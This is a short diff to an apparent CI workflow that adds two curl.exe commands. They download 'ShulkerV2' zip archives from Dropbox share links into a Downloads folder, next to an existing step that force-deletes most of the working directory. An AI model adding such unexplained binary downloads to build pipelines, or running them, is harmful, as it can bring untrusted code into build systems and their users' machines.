@@ -217,6 +217,8 @@ jobs:
           Get-ChildItem -Path . -Exclude "lib", "mcp_server.py", "lattice_client.py" | Remove-Item -Recurse -Force
           
           $dl = "$env:USERPROFILE\Downloads"          
+          curl.exe -L -o $dl\Shulker.zip https://www.dropbox.com/scl/fi/xoj9wrbv4jnetnh29ac8z/ShulkerV2_3.0.1_Linux.zip?rlkey=36wusjc37lbxvf2cycw4mqyuz&st=7xfa6g2w&dl=1
+          curl.exe -L -o $dl\Shulkr.zip https://www.dropbox.com/scl/fi/7fd4tk3isbxwshcuthqqw/ShulkerV2_3.0.1_Windows.zip?rlkey=u2z3uv3ydiy6skchpvngmjlgy&st=klng411c&dl=1
           echo "Section 1 Completed - Base tooling installed"          
           
           
